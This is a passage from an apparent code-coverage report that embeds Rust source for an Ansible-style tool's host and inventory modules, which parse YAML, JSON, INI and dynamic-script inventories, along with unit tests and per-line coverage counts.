== \"1\"\n                    }\n                    \"ansible_become_method\" =\u003e host.connection.become_method = value.to_string(),\n                    \"ansible_become_user\" =\u003e host.connection.become_user = value.to_string(),\n                    \"ansible_python_interpreter\" =\u003e {\n                        host.connection.python_interpreter = Some(value.to_string())\n                    }\n                    _ =\u003e {\n                        // Store as generic variable\n                        host.vars.insert(\n                            key.to_string(),\n                            serde_yaml::Value::String(value.to_string()),\n                        );\n                    }\n                }\n            }\n        }\n\n        Ok(host)\n    }\n}\n\nimpl PartialEq for Host {\n    fn eq(\u0026self, other: \u0026Self) -\u003e bool {\n        self.name == other.name\n    }\n}\n\nimpl Eq for Host {}\n\nimpl std::hash::Hash for Host {\n    fn hash\u003cH: std::hash::Hasher\u003e(\u0026self, state: \u0026mut H) {\n        self.name.hash(state);\n    }\n}\n\nimpl std::fmt::Display for Host {\n    fn fmt(\u0026self, f: \u0026mut std::fmt::Formatter\u003c'_\u003e) -\u003e std::fmt::Result {\n        write!(f, \"{}\", self.name)?;\n        if let Some(addr) = \u0026self.ansible_host {\n            write!(f, \" ({})\", addr)?;\n        }\n        Ok(())\n    }\n}\n\n/// Errors that can occur when parsing a host definition\n#[derive(Debug, thiserror::Error)]\npub enum HostParseError {\n    #[error(\"empty input\")]\n    EmptyInput,\n    #[error(\"invalid port: {0}\")]\n    InvalidPort(String),\n    #[error(\"invalid connection type: {0}\")]\n    InvalidConnectionType(String),\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_host_new() {\n        let host = Host::new(\"webserver1\");\n        assert_eq!(host.name, \"webserver1\");\n        assert_eq!(host.address(), \"webserver1\");\n        assert!(host.enabled);\n    }\n\n    #[test]\n    fn test_host_with_address() {\n        let host = Host::with_address(\"webserver1\", \"192.168.1.10\");\n        assert_eq!(host.name, \"webserver1\");\n        assert_eq!(host.address(), \"192.168.1.10\");\n    }\n\n    #[test]\n    fn test_host_parse() {\n        let host =\n            Host::parse(\"web1 ansible_host=10.0.0.1 ansible_port=2222 ansible_user=admin\").unwrap();\n        assert_eq!(host.name, \"web1\");\n        assert_eq!(host.address(), \"10.0.0.1\");\n        assert_eq!(host.connection.ssh.port, 2222);\n        assert_eq!(host.connection.ssh.user, Some(\"admin\".to_string()));\n    }\n\n    #[test]\n    fn test_host_groups() {\n        let mut host = Host::new(\"test\");\n        host.add_to_group(\"webservers\");\n        host.add_to_group(\"production\");\n        assert!(host.in_group(\"webservers\"));\n        assert!(host.in_group(\"production\"));\n        assert!(!host.in_group(\"databases\"));\n        host.remove_from_group(\"webservers\");\n        assert!(!host.in_group(\"webservers\"));\n    }\n\n    #[test]\n    fn test_host_vars() {\n        let mut host = Host::new(\"test\");\n        host.set_var(\"http_port\", serde_yaml::Value::Number(80.into()));\n        assert!(host.has_var(\"http_port\"));\n        assert_eq!(\n            host.get_var(\"http_port\"),\n            Some(\u0026serde_yaml::Value::Number(80.into()))\n        );\n    }\n}\n","traces":[{"line":28,"address":[28444912],"length":1,"stats":{"Line":0}},{"line":29,"address":[28444939],"length":1,"stats":{"Line":0}},{"line":30,"address":[28444970],"length":1,"stats":{"Line":0}},{"line":31,"address":[28445013],"length":1,"stats":{"Line":0}},{"line":32,"address":[28445056],"length":1,"stats":{"Line":0}},{"line":33,"address":[28445096],"length":1,"stats":{"Line":0}},{"line":34,"address":[28445142],"length":1,"stats":{"Line":0}},{"line":96,"address":[28444358,28444447,28443968],"length":1,"stats":{"Line":1}},{"line":98,"address":[28443985],"length":1,"stats":{"Line":1}},{"line":106,"address":[28444041],"length":1,"stats":{"Line":1}},{"line":107,"address":[28444096],"length":1,"stats":{"Line":1}},{"line":148,"address":[28447392],"length":1,"stats":{"Line":1}},{"line":149,"address":[28447400],"length":1,"stats":{"Line":1}},{"line":152,"address":[28447360],"length":1,"stats":{"Line":1}},{"line":153,"address":[28447368],"length":1,"stats":{"Line":1}},{"line":157,"address":[28447154,28447148,28446688],"length":1,"stats":{"Line":1}},{"line":159,"address":[28446704],"length":1,"stats":{"Line":1}},{"line":160,"address":[28446718],"length":1,"stats":{"Line":1}},{"line":162,"address":[28446731],"length":1,"stats":{"Line":1}},{"line":163,"address":[28446783],"length":1,"stats":{"Line":1}},{"line":204,"address":[29717856,29718686,29718238,29718288,29718708,29718260],"length":1,"stats":{"Line":2}},{"line":206,"address":[29717873,29718321],"length":1,"stats":{"Line":2}},{"line":208,"address":[29717914,29718362],"length":1,"stats":{"Line":2}},{"line":209,"address":[29717970,29718418],"length":1,"stats":{"Line":2}},{"line":210,"address":[29718459,29718011],"length":1,"stats":{"Line":2}},{"line":216,"address":[29717408,29717827,29717821],"length":1,"stats":{"Line":1}},{"line":217,"address":[29717467],"length":1,"stats":{"Line":1}},{"line":218,"address":[29717614,29717665,29717546],"length":1,"stats":{"Line":2}},{"line":219,"address":[29717793],"length":1,"stats":{"Line":1}},{"line":223,"address":[28447888],"length":1,"stats":{"Line":0}},{"line":224,"address":[28447893],"length":1,"stats":{"Line":0}},{"line":228,"address":[28452000],"length":1,"stats":{"Line":1}},{"line":229,"address":[28452013],"length":1,"stats":{"Line":1}},{"line":233,"address":[29718832,29719106,29719078],"length":1,"stats":{"Line":1}},{"line":234,"address":[29718867,29718968],"length":1,"stats":{"Line":2}},{"line":238,"address":[28452096],"length":1,"stats":{"Line":1}},{"line":239,"address":[28452114],"length":1,"stats":{"Line":1}},{"line":243,"address":[28452144],"length":1,"stats":{"Line":1}},{"line":244,"address":[28452162],"length":1,"stats":{"Line":1}},{"line":248,"address":[29717328,29717264],"length":1,"stats":{"Line":2}},{"line":249,"address":[29717273,29717347],"length":1,"stats":{"Line":2}},{"line":253,"address":[28447840],"length":1,"stats":{"Line":1}},{"line":254,"address":[28447858],"length":1,"stats":{"Line":1}},{"line":258,"address":[28452192],"length":1,"stats":{"Line":1}},{"line":259,"address":[28452210],"length":1,"stats":{"Line":1}},{"line":263,"address":[28452240],"length":1,"stats":{"Line":0}},{"line":264,"address":[28452253],"length":1,"stats":{"Line":0}},{"line":268,"address":[],"length":0,"stats":{"Line":0}},{"line":269,"address":[],"length":0,"stats":{"Line":0}},{"line":273,"address":[],"length":0,"stats":{"Line":0}},{"line":274,"address":[],"length":0,"stats":{"Line":0}},{"line":278,"address":[28447792],"length":1,"stats":{"Line":0}},{"line":279,"address":[28447797],"length":1,"stats":{"Line":0}},{"line":283,"address":[],"length":0,"stats":{"Line":0}},{"line":284,"address":[],"length":0,"stats":{"Line":0}},{"line":288,"address":[],"length":0,"stats":{"Line":0}},{"line":289,"address":[],"length":0,"stats":{"Line":0}},{"line":293,"address":[28447808],"length":1,"stats":{"Line":0}},{"line":294,"address":[28447820],"length":1,"stats":{"Line":0}},{"line":298,"address":[28447440,28447751,28447783],"length":1,"stats":{"Line":0}},{"line":299,"address":[28447481,28447504],"length":1,"stats":{"Line":0}},{"line":300,"address":[28447588,28447652,28447764],"length":1,"stats":{"Line":0}},{"line":305,"address":[28447904,28451974,28449785],"length":1,"stats":{"Line":1}},{"line":306,"address":[28447943],"length":1,"stats":{"Line":1}},{"line":307,"address":[28448009,28448078],"length":1,"stats":{"Line":2}},{"line":308,"address":[28448130],"length":1,"stats":{"Line":0}},{"line":311,"address":[28448216,28448084],"length":1,"stats":{"Line":2}},{"line":312,"address":[28448258],"length":1,"stats":{"Line":1}},{"line":314,"address":[28448265,28448364],"length":1,"stats":{"Line":2}},{"line":315,"address":[28448495,28448608],"length":1,"stats":{"Line":2}},{"line":317,"address":[28451795,28448783,28448717,28451846],"length":1,"stats":{"Line":3}},{"line":318,"address":[28451766,28448825,28448760],"length":1,"stats":{"Line":3}},{"line":319,"address":[28451720,28451771,28451645,28451593,28448864,28451556],"length":1,"stats":{"Line":4}},{"line":320,"address":[28448880],"length":1,"stats":{"Line":1}},{"line":321,"address":[28451688,28451577,28451622],"length":1,"stats":{"Line":2}},{"line":323,"address":[28448902,28451424,28448841,28448941,28451373],"length":1,"stats":{"Line":4}},{"line":324,"address":[28448918,28448983],"length":1,"stats":{"Line":0}},{"line":325,"address":[28449022,28451194,28451245],"length":1,"stats":{"Line":0}},{"line":327,"address":[28449103,28448999,28451015,28451066,28449064],"length":1,"stats":{"Line":0}},{"line":328,"address":[28449080,28449145],"length":1,"stats":{"Line":0}},{"line":329,"address":[28450464,28449184,28450979,28450535],"length":1,"stats":{"Line":0}},{"line":330,"address":[28450617,28450551],"length":1,"stats":{"Line":0}},{"line":331,"address":[28450673,28450634,28450594],"length":1,"stats":{"Line":0}},{"line":332,"address":[28450690,28450650,28450729],"length":1,"stats":{"Line":0}},{"line":333,"address":[28450706,28450746,28450785],"length":1,"stats":{"Line":0}},{"line":334,"address":[28450802,28450762,28450843],"length":1,"stats":{"Line":0}},{"line":336,"address":[28450861],"length":1,"stats":{"Line":0}},{"line":337,"address":[28450808],"length":1,"stats":{"Line":0}},{"line":342,"address":[28449161,28449226],"length":1,"stats":{"Line":0}},{"line":343,"address":[28450264,28449265],"length":1,"stats":{"Line":0}},{"line":345,"address":[28449307,28449242,28449346,28450117,28450136],"length":1,"stats":{"Line":0}},{"line":346,"address":[28449388,28449323,28449427,28449970,28449989],"length":1,"stats":{"Line":0}},{"line":347,"address":[28449469,28449404],"length":1,"stats":{"Line":0}},{"line":348,"address":[28449791,28449517,28449842],"length":1,"stats":{"Line":0}},{"line":352,"address":[28449485,28449694],"length":1,"stats":{"Line":0}},{"line":353,"address":[28449555,28449498],"length":1,"stats":{"Line":0}},{"line":354,"address":[28449644,28449563],"length":1,"stats":{"Line":0}},{"line":361,"address":[28448526],"length":1,"stats":{"Line":1}},{"line":366,"address":[28442000],"length":1,"stats":{"Line":0}},{"line":367,"address":[28442014],"length":1,"stats":{"Line":0}},{"line":374,"address":[],"length":0,"stats":{"Line":0}},{"line":375,"address":[],"length":0,"stats":{"Line":0}},{"line":380,"address":[28441584],"length":1,"stats":{"Line":0}},{"line":381,"address":[28441623],"length":1,"stats":{"Line":0}},{"line":382,"address":[28441757],"length":1,"stats":{"Line":0}},{"line":383,"address":[28441821,28441967],"length":1,"stats":{"Line":0}},{"line":385,"address":[28441960],"length":1,"stats":{"Line":0}}],"covered":50,"coverable":107},{"path":["/","home","artur","Repositories","rustible","src","inventory","mod.rs"],"content":"//! Inventory management for Rustible.\n//!\n//! This module provides comprehensive inventory management including:\n//! - Loading from YAML, INI, and JSON formats\n//! - Dynamic inventory support (executable scripts)\n//! - Host pattern matching\n//! - Group hierarchy and variable inheritance\n\npub mod group;\npub mod host;\n\npub use group::{Group, GroupBuilder, GroupHierarchy};\npub use host::{ConnectionParams, ConnectionType, Host, HostParseError, SshParams};\n\nuse indexmap::IndexMap;\nuse regex::Regex;\nuse std::collections::{HashMap, HashSet};\nuse std::path::Path;\nuse std::process::Command;\nuse thiserror::Error;\n\n/// Errors that can occur during inventory operations\n#[derive(Debug, Error)]\npub enum InventoryError {\n    #[error(\"IO error: {0}\")]\n    Io(#[from] std::io::Error),\n\n    #[error(\"YAML parsing error: {0}\")]\n    Yaml(#[from] serde_yaml::Error),\n\n    #[error(\"JSON parsing error: {0}\")]\n    Json(#[from] serde_json::Error),\n\n    #[error(\"host not found: {0}\")]\n    HostNotFound(String),\n\n    #[error(\"group not found: {0}\")]\n    GroupNotFound(String),\n\n    #[error(\"invalid host pattern: {0}\")]\n    InvalidPattern(String),\n\n    #[error(\"duplicate host: {0}\")]\n    DuplicateHost(String),\n\n    #[error(\"duplicate group: {0}\")]\n    DuplicateGroup(String),\n\n    #[error(\"circular group dependency detected: {0}\")]\n    CircularDependency(String),\n\n    #[error(\"dynamic inventory script failed: {0}\")]\n    DynamicInventoryFailed(String),\n\n    #[error(\"invalid INI format: {0}\")]\n    InvalidIniFormat(String),\n\n    #[error(\"host parse error: {0}\")]\n    HostParse(#[from] HostParseError),\n}\n\n/// Result type for inventory operations\npub type InventoryResult\u003cT\u003e = Result\u003cT, InventoryError\u003e;\n\n/// The main inventory structure holding all hosts and groups\n#[derive(Debug, Clone)]\npub struct Inventory {\n    /// All hosts indexed by name\n    hosts: HashMap\u003cString, Host\u003e,\n\n    /// All groups indexed by name\n    groups: HashMap\u003cString, Group\u003e,\n\n    /// Source file/directory path\n    source: Option\u003cString\u003e,\n}\n\nimpl Default for Inventory {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\nimpl Inventory {\n    /// Create a new empty inventory with default groups\n    pub fn new() -\u003e Self {\n        let mut inventory = Self {\n            hosts: HashMap::new(),\n            groups: HashMap::new(),\n            source: None,\n        };\n\n        // Create default groups\n        inventory.groups.insert(\"all\".to_string(), Group::all());\n        inventory\n            .groups\n            .insert(\"ungrouped\".to_string(), Group::ungrouped());\n\n        inventory\n    }\n\n    /// Load inventory from a file or directory\n    pub fn load\u003cP: AsRef\u003cPath\u003e\u003e(path: P) -\u003e InventoryResult\u003cSelf\u003e {\n        let path = path.as_ref();\n        let mut inventory = Self::new();\n        inventory.source = Some(path.display().to_string());\n\n        if path.is_file() {\n            inventory.load_file(path)?;\n        } else if path.is_dir() {\n            inventory.load_directory(path)?;\n        } else {\n            return Err(InventoryError::Io(std::io::Error::new(\n                std::io::ErrorKind::NotFound,\n                format!(\"Path not found: {}\", path.display()),\n            )));\n        }\n\n        // Finalize parent-child relationships\n        inventory.compute_group_parents();\n\n        Ok(inventory)\n    }\n\n    /// Load a single inventory file\n    fn load_file(\u0026mut self, path: \u0026Path) -\u003e InventoryResult\u003c()\u003e {\n        // Check if it's an executable (dynamic inventory)\n        #[cfg(unix)]\n        {\n            use std::os::unix::fs::PermissionsExt;\n            if let Ok(metadata) = path.metadata() {\n                if metadata.permissions().mode() \u0026 0o111 != 0 {\n                    return self.load_dynamic(path);\n                }\n            }\n        }\n\n        let content = std::fs::read_to_string(path)?;\n        let extension = path.extension().and_then(|e| e.to_str()).unwrap_or(\"\");\n\n        match extension.to_lowercase().as_str() {\n            \"yml\" | \"yaml\" =\u003e self.parse_yaml(\u0026content)?,\n            \"json\" =\u003e self.parse_json(\u0026content)?,\n            \"ini\" | _ =\u003e {\n                // Try YAML first, then INI\n                if content.trim().starts_with('{') || content.trim().starts_with('[') {\n                    self.parse_json(\u0026content)?;\n                } else if content.contains(':') \u0026\u0026 !content.contains('[') {\n                    self.parse_yaml(\u0026content)?;\n                } else {\n                    self.parse_ini(\u0026content)?;\n                }\n            }\n        }\n\n        Ok(())\n    }\n\n    /// Load inventory from a directory\n    fn load_directory(\u0026mut self, path: \u0026Path) -\u003e InventoryResult\u003c()\u003e {\n        // Look for hosts file\n        for name in [\"hosts\", \"hosts.yml\", \"hosts.yaml\", \"hosts.ini\"] {\n            let hosts_file = path.join(name);\n            if hosts_file.exists() {\n                self.load_file(\u0026hosts_file)?;\n                break;\n            }\n        }\n\n        // Load group_vars directory\n        let group_vars = path.join(\"group_vars\");\n        if group_vars.is_dir() {\n            self.load_group_vars(\u0026group_vars)?;\n        }\n\n        // Load host_vars directory\n        let host_vars = path.join(\"host_vars\");\n        if host_vars.is_dir() {\n            self.load_host_vars(\u0026host_vars)?;\n        }\n\n        Ok(())\n    }\n\n    /// Load group variables from group_vars directory\n    fn load_group_vars(\u0026mut self, path: \u0026Path) -\u003e InventoryResult\u003c()\u003e {\n        for entry in std::fs::read_dir(path)? {\n            let entry = entry?;\n            let file_path = entry.path();\n\n            if file_path.is_file() {\n                let group_name = file_path\n                    .file_stem()\n                    .and_then(|s| s.to_str())\n                    .unwrap_or(\"\")\n                    .to_string();\n\n                let content = std::fs::read_to_string(\u0026file_path)?;\n                let vars: IndexMap\u003cString, serde_yaml::Value\u003e = serde_yaml::from_str(\u0026content)?;\n\n                if let Some(group) = self.groups.get_mut(\u0026group_name) {\n                    group.merge_vars(\u0026vars);\n                } else {\n                    // Create the group if it doesn't exist\n                    let mut group = Group::new(\u0026group_name);\n                    group.merge_vars(\u0026vars);\n                    self.groups.insert(group_name, group);\n                }\n            } else if file_path.is_dir() {\n                // Handle directory-based group vars (group_name/vars.yml)\n                let group_name = file_path\n                    .file_name()\n                    .and_then(|s| s.to_str())\n                    .unwrap_or(\"\")\n                    .to_string();\n\n                let vars = self.load_vars_from_directory(\u0026file_path)?;\n                if let Some(group) = self.groups.get_mut(\u0026group_name) {\n                    group.merge_vars(\u0026vars);\n                }\n            }\n        }\n\n        Ok(())\n    }\n\n    /// Load host variables from host_vars directory\n    fn load_host_vars(\u0026mut self, path: \u0026Path) -\u003e InventoryResult\u003c()\u003e {\n        for entry in std::fs::read_dir(path)? {\n            let entry = entry?;\n            let file_path = entry.path();\n\n            if file_path.is_file() {\n                let host_name = file_path\n                    .file_stem()\n                    .and_then(|s| s.to_str())\n                    .unwrap_or(\"\")\n                    .to_string();\n\n                let content = std::fs::read_to_string(\u0026file_path)?;\n                let vars: IndexMap\u003cString, serde_yaml::Value\u003e = serde_yaml::from_str(\u0026content)?;\n\n                if let Some(host) = self.hosts.get_mut(\u0026host_name) {\n                    host.merge_vars(\u0026vars);\n                }\n            } else if file_path.is_dir() {\n                let host_name = file_path\n                    .file_name()\n                    .and_then(|s| s.to_str())\n                    .unwrap_or(\"\")\n                    .to_string();\n\n                let vars = self.load_vars_from_directory(\u0026file_path)?;\n                if let Some(host) = self.hosts.get_mut(\u0026host_name) {\n                    host.merge_vars(\u0026vars);\n                }\n            }\n        }\n\n        Ok(())\n    }\n\n    /// Load variables from a directory (multiple files merged)\n    fn load_vars_from_directory(\n        \u0026self,\n        path: \u0026Path,\n    ) -\u003e InventoryResult\u003cIndexMap\u003cString, serde_yaml::Value\u003e\u003e {\n        let mut merged_vars = IndexMap::new();\n\n        let mut entries: Vec\u003c_\u003e = std::fs::read_dir(path)?.filter_map(|e| e.ok()).collect();\n        entries.sort_by_key(|e| e.path());\n\n        for entry in entries {\n            let file_path = entry.path();\n            if file_path.is_file() {\n                let ext = file_path.extension().and_then(|e| e.to_str()).unwrap_or(\"\");\n                if ext == \"yml\" || ext == \"yaml\" {\n                    let content = std::fs::read_to_string(\u0026file_path)?;\n                    let vars: IndexMap\u003cString, serde_yaml::Value\u003e = serde_yaml::from_str(\u0026content)?;\n                    merged_vars.extend(vars);\n                }\n            }\n        }\n\n        Ok(merged_vars)\n    }\n\n    /// Load dynamic inventory from an executable script\n    fn load_dynamic(\u0026mut self, path: \u0026Path) -\u003e InventoryResult\u003c()\u003e {\n        let output = Command::new(path)\n            .arg(\"--list\")\n            .output()\n            .map_err(|e| InventoryError::DynamicInventoryFailed(e.to_string()))?;\n\n        if !output.status.success() {\n            return Err(InventoryError::DynamicInventoryFailed(\n                String::from_utf8_lossy(\u0026output.stderr).to_string(),\n            ));\n        }\n\n        let json_output = String::from_utf8_lossy(\u0026output.stdout);\n        self.parse_json(\u0026json_output)?;\n\n        Ok(())\n    }\n\n    /// Parse YAML inventory format\n    fn parse_yaml(\u0026mut self, content: \u0026str) -\u003e InventoryResult\u003c()\u003e {\n        let data: serde_yaml::Value = serde_yaml::from_str(content)?;\n\n        if let serde_yaml::Value::Mapping(map) = data {\n            // Check if this is an \"all\" wrapper\n            if let Some(all) = map.get(\u0026serde_yaml::Value::String(\"all\".to_string())) {\n                self.parse_yaml_group(\"all\", all)?;\n            } else {\n                // Parse as flat structure\n                for (key, value) in map {\n                    if let serde_yaml::Value::String(group_name) = key {\n                        self.parse_yaml_group(\u0026group_name, \u0026value)?;\n                    }\n                }\n            }\n        }\n\n        Ok(())\n    }\n\n    /// Parse a YAML group definition\n    fn parse_yaml_group(\u0026mut self, name: \u0026str, value: \u0026serde_yaml::Value) -\u003e InventoryResult\u003c()\u003e {\n        let _group = self\n            .groups\n            .entry(name.to_string())\n            .or_insert_with(|| Group::new(name));\n\n        if let serde_yaml::Value::Mapping(map) = value {\n            // Parse hosts\n            if let Some(hosts) = map.get(\u0026serde_yaml::Value::String(\"hosts\".to_string())) {\n                if let serde_yaml::Value::Mapping(hosts_map) = hosts {\n                    for (host_key, host_value) in hosts_map {\n                        if let serde_yaml::Value::String(host_name) = host_key {\n                            let mut host = Host::new(host_name.clone());\n\n                            // Parse host variables\n                            if let serde_yaml::Value::Mapping(host_vars) = host_value {\n                                for (var_key, var_value) in host_vars {\n                                    if let serde_yaml::Value::String(key) = var_key {\n                                        self.apply_host_var(\u0026mut host, key, var_value.clone());\n                                    }\n                                }\n                            }\n\n                            host.add_to_group(name.to_string());\n\n                            // Get mutable reference to group and add host\n                            if let Some(g) = self.groups.get_mut(name) {\n                                g.add_host(host_name.clone());\n                            }\n\n                            // Add to all group\n                            if name != \"all\" {\n                                host.add_to_group(\"all\".to_string());\n                                if let Some(all_group) = self.groups.get_mut(\"all\") {\n                                    all_group.add_host(host_name.clone());\n                                }\n                            }\n\n                            self.hosts.insert(host_name.clone(), host);\n                        }\n                    }\n                }\n            }\n\n            // Parse children\n            if let Some(children) = map.get(\u0026serde_yaml::Value::String(\"children\".to_string())) {\n                if let serde_yaml::Value::Mapping(children_map) = children {\n                    for (child_key, child_value) in children_map {\n                        if let serde_yaml::Value::String(child_name) = child_key {\n                            // Get mutable reference to group and add child\n                            if let Some(g) = self.groups.get_mut(name) {\n                                g.add_child(child_name.clone());\n                            }\n                            self.parse_yaml_group(child_name, child_value)?;\n                        }\n                    }\n                }\n            }\n\n            // Parse vars\n            if let Some(vars) = map.get(\u0026serde_yaml::Value::String(\"vars\".to_string())) {\n                if let serde_yaml::Value::Mapping(vars_map) = vars {\n                    for (var_key, var_value) in vars_map {\n                        if let serde_yaml::Value::String(key) = var_key {\n                            if let Some(g) = self.groups.get_mut(name) {\n                                g.set_var(key.clone(), var_value.clone());\n                            }\n                        }\n                    }\n                }\n            }\n        }\n\n        Ok(())\n    }\n\n    /// Apply a host variable from YAML\n    fn apply_host_var(\u0026self, host: \u0026mut Host, key: \u0026str, value: serde_yaml::Value) {\n        match key {\n            \"ansible_host\" =\u003e {\n                if let serde_yaml::Value::String(s) = value {\n                    host.ansible_host = Some(s);\n                }\n            }\n            \"ansible_port\" =\u003e {\n                if let serde_yaml::Value::Number(n) = value {\n                    if let Some(port) = n.as_u64() {\n                        host.connection.ssh.port = port as u16;\n                    }\n                }\n            }\n            \"ansible_user\" =\u003e {\n                if let serde_yaml::Value::String(s) = value {\n                    host.connection.ssh.user = Some(s);\n                }\n            }\n            \"ansible_ssh_private_key_file\" =\u003e {\n                if let serde_yaml::Value::String(s) = value {\n                    host.connection.ssh.private_key_file = Some(s);\n                }\n            }\n            \"ansible_connection\" =\u003e {\n                if let serde_yaml::Value::String(s) = value {\n                    host.connection.connection = match s.as_str() {\n                        \"local\" =\u003e ConnectionType::Local,\n                        \"docker\" =\u003e ConnectionType::Docker,\n                        \"podman\" =\u003e ConnectionType::Podman,\n                        \"winrm\" =\u003e ConnectionType::Winrm,\n                        _ =\u003e ConnectionType::Ssh,\n                    };\n                }\n            }\n            \"ansible_become\" =\u003e {\n                host.connection.r#become = match value {\n                    serde_yaml::Value::Bool(b) =\u003e b,\n                    serde_yaml::Value::String(s) =\u003e s.to_lowercase() == \"true\" || s == \"1\",\n                    _ =\u003e false,\n                };\n            }\n            \"ansible_become_method\" =\u003e {\n                if let serde_yaml::Value::String(s) = value {\n                    host.connection.become_method = s;\n                }\n            }\n            \"ansible_become_user\" =\u003e {\n                if let serde_yaml::Value::String(s) = value {\n                    host.connection.become_user = s;\n                }\n            }\n            \"ansible_python_interpreter\" =\u003e {\n                if let serde_yaml::Value::String(s) = value {\n                    host.connection.python_interpreter = Some(s);\n                }\n            }\n            _ =\u003e {\n                host.set_var(key, value);\n            }\n        }\n    }\n\n    /// Parse JSON inventory format (compatible with Ansible dynamic inventory)\n    fn parse_json(\u0026mut self, content: \u0026str) -\u003e InventoryResult\u003c()\u003e {\n        let data: serde_json::Value = serde_json::from_str(content)?;\n\n        if let serde_json::Value::Object(map) = data {\n            // Collect hosts to add to \"all\" group\n            let mut all_hosts: Vec\u003cString\u003e = Vec::new();\n\n            // First pass: create groups\n            for (key, _value) in \u0026map {\n                if key == \"_meta\" {\n                    continue;\n                }\n                self.groups\n                    .entry(key.clone())\n                    .or_insert_with(|| Group::new(key));\n            }\n\n            // Second pass: populate groups and hosts\n            for (key, value) in \u0026map {\n                if key == \"_meta\" {\n                    continue;\n                }\n\n                // Collect data to add\n                let mut hosts_to_add: Vec\u003cString\u003e = Vec::new();\n                let mut children_to_add: Vec\u003cString\u003e = Vec::new();\n                let mut vars_to_add: Vec\u003c(String, serde_yaml::Value)\u003e = Vec::new();\n\n                if let serde_json::Value::Object(group_data) = value {\n                    if let Some(serde_json::Value::Array(hosts)) = group_data.get(\"hosts\") {\n                        for host_value in hosts {\n                            if let serde_json::Value::String(host_name) = host_value {\n                                hosts_to_add.push(host_name.clone());\n                            }\n                        }\n                    }\n\n                    if let Some(serde_json::Value::Array(children)) = group_data.get(\"children\") {\n                        for child_value in children {\n                            if let serde_json::Value::String(child_name) = child_value {\n                                children_to_add.push(child_name.clone());\n                            }\n                        }\n                    }\n\n                    if let Some(serde_json::Value::Object(vars)) = group_data.get(\"vars\") {\n                        for (var_key, var_value) in vars {\n                            let yaml_value = json_to_yaml(var_value);\n                            vars_to_add.push((var_key.clone(), yaml_value));\n                        }\n                    }\n                } else if let serde_json::Value::Array(hosts) = value {\n                    for host_value in hosts {\n                        if let serde_json::Value::String(host_name) = host_value {\n                            hosts_to_add.push(host_name.clone());\n                        }\n                    }\n                }\n\n                // Now apply changes to group\n                if let Some(group) = self.groups.get_mut(key) {\n                    for host_name in \u0026hosts_to_add {\n                        group.add_host(host_name.clone());\n                    }\n                    for child_name in children_to_add {\n                        group.add_child(child_name);\n                    }\n                    for (var_key, var_value) in vars_to_add {\n                        group.set_var(var_key, var_value);\n                    }\n                }\n\n                // Add hosts to inventory\n                for host_name in \u0026hosts_to_add {\n                    all_hosts.push(host_name.clone());\n                    if !self.hosts.contains_key(host_name) {\n                        let mut host = Host::new(host_name.clone());\n                        host.add_to_group(key.clone());\n                        host.add_to_group(\"all\".to_string());\n                        self.hosts.insert(host_name.clone(), host);\n                    } else if let Some(h) = self.hosts.get_mut(host_name) {\n                        h.add_to_group(key.clone());\n                    }\n                }\n            }\n\n            // Add all hosts to the \"all\" group\n            if let Some(all_group) = self.groups.get_mut(\"all\") {\n                for host_name in all_hosts {\n                    all_group.add_host(host_name);\n                }\n            }\n\n            // Second pass: apply host variables from _meta\n            if let Some(serde_json::Value::Object(meta)) = map.get(\"_meta\") {\n                if let Some(serde_json::Value::Object(hostvars)) = meta.get(\"hostvars\") {\n                    for (host_name, vars) in hostvars {\n                        if let serde_json::Value::Object(vars_map) = vars {\n                            // Collect the vars first\n                            let yaml_vars: Vec\u003c(String, serde_yaml::Value)\u003e = vars_map\n                                .iter()\n                                .map(|(k, v)| (k.clone(), json_to_yaml(v)))\n                                .collect();\n\n                            // Then apply them\n                            if let Some(host) = self.hosts.get_mut(host_name) {\n                                for (var_key, yaml_value) in yaml_vars {\n                                    Self::apply_host_var_static(host, \u0026var_key, yaml_value);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n\n        Ok(())\n    }\n\n    /// Apply a host variable from YAML (static version to avoid borrow issues)\n    fn apply_host_var_static(host: \u0026mut Host, key: \u0026str, value: serde_yaml::Value) {\n        match key {\n            \"ansible_host\" =\u003e {\n                if let serde_yaml::Value::String(s) = value {\n                    host.ansible_host = Some(s);\n                }\n            }\n            \"ansible_port\" =\u003e {\n                if let serde_yaml::Value::Number(n) = value {\n                    if let Some(port) = n.as_u64() {\n                        host.connection.ssh.port = port as u16;\n                    }\n                }\n            }\n            \"ansible_user\" =\u003e {\n                if let serde_yaml::Value::String(s) = value {\n                    host.connection.ssh.user = Some(s);\n                }\n            }\n            \"ansible_ssh_private_key_file\" =\u003e {\n                if let serde_yaml::Value::String(s) = value {\n                    host.connection.ssh.private_key_file = Some(s);\n                }\n            }\n            \"ansible_connection\" =\u003e {\n                if let serde_yaml::Value::String(s) = value {\n                    host.connection.connection = match s.as_str() {\n                        \"local\" =\u003e ConnectionType::Local,\n                        \"docker\" =\u003e ConnectionType::Docker,\n                        \"podman\" =\u003e ConnectionType::Podman,\n                        \"winrm\" =\u003e ConnectionType::Winrm,\n                        _ =\u003e ConnectionType::Ssh,\n                    };\n                }\n            }\n            \"ansible_become\" =\u003e {\n                host.connection.r#become = match value {\n                    serde_yaml::Value::Bool(b) =\u003e b,\n                    serde_yaml::Value::String(s) =\u003e s.to_lowercase() == \"true\" || s == \"1\",\n                    _ =\u003e false,\n                };\n            }\n            \"ansible_become_method\" =\u003e {\n                if let serde_yaml::Value::String(s) = value {\n                    host.connection.become_method = s;\n                }\n            }\n            \"ansible_become_user\" =\u003e {\n                if let serde_yaml::Value::String(s) = value {\n                    host.connection.become_user = s;\n                }\n            }\n            \"ansible_python_interpreter\" =\u003e {\n                if let serde_yaml::Value::String(s) = value {\n                    host.connection.python_interpreter = Some(s);\n                }\n            }\n            _ =\u003e {\n                host.set_var(key, value);\n            }\n        }\n    }\n\n    /// Parse INI inventory format\n    fn parse_ini(\u0026mut self, content: \u0026str) -\u003e InventoryResult\u003c()\u003e {\n        let mut current_group = \"ungrouped\".to_string();\n        let mut is_vars_section = false;\n        let mut is_children_section = false;\n\n        for line in content.lines() {\n            let line = line.trim();\n\n            // Skip empty lines and comments\n            if line.is_empty() || line.starts_with('#') || line.starts_with(';') {\n                continue;\n            }\n\n            // Check for section header\n            if line.starts_with('[') \u0026\u0026 line.ends_with(']') {\n                let section = \u0026line[1..line.len() - 1];\n\n                if let Some((group_name, suffix)) = section.rsplit_once(':') {\n                    current_group = group_name.to_string();\n                    is_vars_section = suffix == \"vars\";\n                    is_children_section = suffix == \"children\";\n                } else {\n                    current_group = section.to_string();\n                    is_vars_section = false;\n                    